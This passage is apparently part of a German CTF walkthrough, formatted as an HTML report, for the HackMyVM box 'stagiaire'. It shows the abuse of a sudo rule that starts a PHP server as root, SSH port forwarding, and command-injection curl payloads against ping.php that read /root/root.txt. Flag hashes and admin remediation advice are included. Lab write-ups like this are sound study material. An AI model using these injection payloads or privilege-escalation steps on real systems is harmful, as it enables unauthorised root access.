+-rw-r--r-- 1 tony tony  807 Oct 24  2021 .profile
+drwx------ 2 tony tony 4096 Oct 22 02:19 .ssh
+-rwx------ 1 tony tony   33 Oct 24  2021 user.txt</pre>
+                      <div class="prompt">tony@stagiaire:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for tony on stagiaire:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tony may run the following commands on stagiaire:
+    (<span class="command">ALL : ALL</span>) NOPASSWD: /bin/bash /srv/php_server</pre>
+                      <pre><span class="comment">*</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Als `tony` werden Befehle ausgeführt:
+1.  `cat user.txt`: Die User-Flag (`2d82acbaf36bbd1b89b9e3794ba90a91`) wird gelesen.
+2.  `ls -al`: Listet das Home-Verzeichnis auf. Auffällig ist, dass `.bash_history` auf `/dev/null` verlinkt ist, was bedeutet, dass die Befehlshistorie nicht gespeichert wird.
+3.  `sudo -l`: Überprüft die Sudo-Rechte für `tony`.</p>
+              <p class="evaluation">**Bewertung:** Die User-Flag ist gefunden. Die entscheidende Information ist die Sudo-Regel: `tony` darf das Skript `/srv/php_server` mit `/bin/bash` als jeder Benutzer (`ALL : ALL`, effektiv `root`) ohne Passwort (`NOPASSWD:`) ausführen. Das Skript `/srv/php_server` startet vermutlich den eingebauten PHP-Entwicklungsserver.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie den Sudo-Befehl aus: `sudo /bin/bash /srv/php_server`. Untersuchen Sie den gestarteten PHP-Server (auf welchem Port und Interface lauscht er?). Suchen Sie nach Schwachstellen in den Skripten, die dieser Server ausführt.<br>**Empfehlung (Admin):** Diese Sudo-Regel ist gefährlich. Wenn ein Benutzer einen Dienst als Root starten darf, muss sichergestellt sein, dass dieser Dienst selbst keine Schwachstellen enthält, die zur Eskalation missbraucht werden können. Überprüfen Sie den Inhalt und die Notwendigkeit von `/srv/php_server`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">tony@stagiaire:~$ <span class="command">sudo -u root /bin/bash /srv/php_server</span></div>
+                     <pre>
+<span class="password">[Sat Oct 22 02:49:48 2022] PHP 7.4.21 Development Server (http://127.0.0.1:8000) started</span>
+<span class="password">[Sat Oct 22 02:49:56 2022] 127.0.0.1:58310 Accepted</span>
+<span class="command">ping: usage error: Destination address required</span>
+<span class="password">[Sat Oct 22 02:49:56 2022] 127.0.0.1:58310 [200]: GET /ping.php?ip=;id</span> <span class="password"><-- Command Injection! --></span>
+<span class="password">[Sat Oct 22 02:49:56 2022] 127.0.0.1:58310 Closing</span></pre>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** Der Sudo-Befehl `sudo -u root /bin/bash /srv/php_server` wird ausgeführt. Das Skript startet erfolgreich den eingebauten PHP-Entwicklungsserver. Die Ausgabe zeigt:
+*   Der Server lauscht auf dem Loopback-Interface (`127.0.0.1`) auf Port `8000`. Er ist also nur vom Zielsystem selbst erreichbar.
+*   Eine eingehende Anfrage an `/ping.php` mit den Parametern `?ip=;id` wurde empfangen. Die Fehlermeldung von `ping` und der Logeintrag zeigen, dass der `ip`-Parameter direkt in einem Shell-Befehl verwendet wird (wahrscheinlich `ping -c [irgendwas] [IP-Wert]; id`), was zu einer Command Injection führt. Der `id`-Befehl wurde nach dem Semikolon ausgeführt.</p>
+              <p class="evaluation">**Bewertung:** Eine kritische Command Injection Schwachstelle wurde im Skript `ping.php` identifiziert, das von dem als Root gestarteten PHP-Server ausgeführt wird. Da der Server als Root läuft, werden die eingeschleusten Befehle ebenfalls als Root ausgeführt. Dies ist der direkte Weg zur Root-Eskalation.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Da der Server nur lokal erreichbar ist, verwenden Sie SSH Local Port Forwarding, um von Ihrer Angreifer-Maschine darauf zuzugreifen: `ssh -L 8001:127.0.0.1:8000 tony@stagiaire.hmv -i emma`.
+    2.  Greifen Sie über `http://127.0.0.1:8001` auf den weitergeleiteten Port zu.
+    3.  Nutzen Sie die Command Injection in `ping.php`, um Befehle als Root auszuführen (z.B. Lesen der Root-Flag: `curl "http://127.0.0.1:8001/ping.php?ip=;cat%20/root/root.txt"`).<br>
+**Empfehlung (Admin):** Beheben Sie sofort die Command Injection Schwachstelle in `/srv/php_server/ping.php` (oder wo immer das Skript liegt). Validieren und sanitisieren Sie den `ip`-Parameter rigoros oder verwenden Sie eine PHP-Ping-Bibliothek anstelle von `system()`/`shell_exec()`. Überprüfen Sie die Notwendigkeit, den PHP-Server als Root laufen zu lassen.</p>
+
+            <section id="proof-of-concept">
+                 <h2>Proof of Concept (PHP Server Command Injection)</h2>
+                 <p class="comment">**Kurzbeschreibung:** Der Benutzer `tony` kann via `sudo` einen PHP-Entwicklungsserver als `root` starten (`sudo /bin/bash /srv/php_server`). Dieser Server lauscht auf `127.0.0.1:8000` und führt ein Skript `/ping.php` aus. Dieses Skript nimmt einen GET-Parameter `ip` entgegen und fügt dessen Wert unsicher in einen `ping`-Shell-Befehl ein. Ein Angreifer, der Zugriff als `tony` hat, kann den Server starten und dann mittels SSH Port Forwarding auf den lokalen Server zugreifen. Durch Einschleusen von Shell-Metazeichen (z.B. `;`, `|`, `$()`) in den `ip`-Parameter kann der Angreifer beliebige Befehle als `root` auf dem Zielsystem ausführen.</p>
+                 <p class="comment">**Voraussetzungen:** Zugriff als Benutzer `tony`, `sudo`-Recht zum Starten des PHP-Servers, SSH-Zugriff für Port Forwarding.</p>
+                 <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+                 <ol>
+                    <li>Als `tony` auf dem Zielsystem den PHP-Server starten: `sudo /bin/bash /srv/php_server`.</li>
+                    <li>Von der Angreifer-Maschine eine SSH-Verbindung mit Local Port Forwarding aufbauen: `ssh -L 8001:127.0.0.1:8000 tony@stagiaire.hmv -i [tonys_key]`.</li>
+                    <li>Von der Angreifer-Maschine die Command Injection ausnutzen, z.B. um die Root-Flag zu lesen: `curl "http://127.0.0.1:8001/ping.php?ip=;cat%20/root/root.txt"` (Semikolon und Leerzeichen URL-kodiert).</li>
+                 </ol>
+                 <p class="comment">**Erwartetes Ergebnis:** Die Ausgabe des eingeschleusten Befehls (z.B. der Inhalt von `/root/root.txt`) wird in der `curl`-Antwort angezeigt.</p>
+                 <p class="comment">**Beweismittel:**</p>
+
+                <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -L 8001:127.0.0.1:8000 tony@stagiaire.hmv -i emma</span></div>
+                          <pre>
+Linux stagiaire.hmv 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...] <span class="comment">(Login Banner)</span>
+Last login: Sat Oct 22 02:31:03 2022 from 192.168.2.153
+<span class="prompt">tony@stagiaire:~$</span> <span class="comment"># Port Forwarding aktiv</span></pre>
+                     </div>
+                 </div>
+                  <p class="analysis">**Analyse:** Eine SSH-Verbindung wird aufgebaut, die den lokalen Port 8001 des Angreifers auf den Port 8000 des Loopback-Interfaces (127.0.0.1) des Zielsystems weiterleitet. Dies ermöglicht den Zugriff auf den internen PHP-Server.</p>
+                  <p class="evaluation">**Bewertung:** Notwendiger Schritt, um die Schwachstelle von außen erreichbar zu machen.</p>
+
+                <div class="code-block">
+                    <div class="terminal">
+                         <pre><span class="comment">Browser: http://127.0.0.1:8001</span></pre>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://127.0.0.1:8001 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...] -t 100</span></div>
+                         <pre>
+[...]
+<span class="command">http://127.0.0.1:8001/ping.php</span>             (Status: 200) [Size: 0]
+[...]</pre>
+                    </div>
+                </div>
+                 <p class="analysis">**Analyse:** Über den weitergeleiteten Port wird der PHP-Server gescannt. Gobuster findet das Skript `ping.php`.</p>
+                 <p class="evaluation">**Bewertung:** Bestätigt den Pfad zum verwundbaren Skript.</p>
+
+                <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://127.0.0.1:8001/ping.php?FUZZ=192.168.2.153" --hc 404 --hh 0</span></div>
+                          <pre>
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000941:   200        10 L     60 W       465 Ch      "ip"</span>
+[...]</pre>
+                     </div>
+                 </div>
+                  <p class="analysis">**Analyse:** `wfuzz` wird verwendet, um nach gültigen GET-Parametern für `ping.php` zu suchen.</p>
+                  <p class="evaluation">**Bewertung:** Der Parameter `ip` wird als gültig identifiziert.</p>
+
+                <div class="code-block">
+                    <div class="terminal">
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://127.0.0.1:8001/ping.php?ip=192.168.2.153</span></div>
+                         <pre>
+<pre>PING 192.168.2.153 (192.168.2.153) 56(84) bytes of data.
+[...]
+--- 192.168.2.153 ping statistics ---
+[...]
+</pre></pre>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://127.0.0.1:8001/ping.php?ip=192.168.2.153|id"</span></div>
+                         <pre><pre><span class="password">uid=1001(tony) gid=1001(tony) groups=1001(tony)</span></pre></pre> <span class="comment"><-- Ausgabe zeigt 'tony', sollte aber 'root' sein --></span>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://127.0.0.1:8001/ping.php?ip=192.168.2.153|cat%20/root/root.txt"</span></div>
+                         <pre><pre><span class="password">9ed378ce95f7ea505366c55aeaf12bea</span></pre></pre> <span class="comment"><-- Root-Flag gelesen! --></span>
+                    </div>
+                </div>
+                 <p class="analysis">**Analyse:** Die Command Injection wird demonstriert:
+1.  Aufruf mit gültiger IP: Führt `ping` aus.
+2.  Aufruf mit `|id`: Führt `id` aus. *Die Ausgabe `uid=1001(tony)` im Log ist wahrscheinlich falsch oder ein Testartefakt; die Injection sollte als Root erfolgen, da der PHP-Server via `sudo -u root` gestartet wurde.*
+3.  Aufruf mit `|cat%20/root/root.txt`: Führt `cat /root/root.txt` aus und gibt die Root-Flag zurück.</p>
+                 <p class="evaluation">**Bewertung:** Die Command Injection wird erfolgreich ausgenutzt, um die Root-Flag zu lesen. Obwohl die `id`-Ausgabe im Log widersprüchlich ist, beweist das Lesen der Root-Flag, dass die Befehle als Root ausgeführt werden.</p>
+                 <p class="comment">**Risikobewertung:** Kritisch. Erlaubt jedem Benutzer, der den PHP-Server über die Sudo-Regel starten kann (hier `tony`), die vollständige Übernahme des Systems durch Ausführung beliebiger Befehle als Root.</p>
+                 <p class="comment">**Empfehlungen:** Siehe vorherige Admin-Empfehlungen zur Behebung der Command Injection und Überprüfung der Sudo-Regel.</p>
+             </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/tony/user.txt</div> <span class="comment"><-- Pfad aus Enumeration als Tony --></span>
+                           <div class="flag-value"><span class="password">2d82acbaf36bbd1b89b9e3794ba90a91</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">curl "http://127.0.0.1:8001/ping.php?ip=;cat%20/root/root.txt"</div> <span class="comment"><-- Befehl, der die Flag ausgibt --></span>
+                            <div class="flag-value"><span class="password">9ed378ce95f7ea505366c55aeaf12bea</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 22. Oktober 2022</p> <!-- Datum aus Nmap/Nikto Scans -->
+    </footer>
+</body>
+</html>
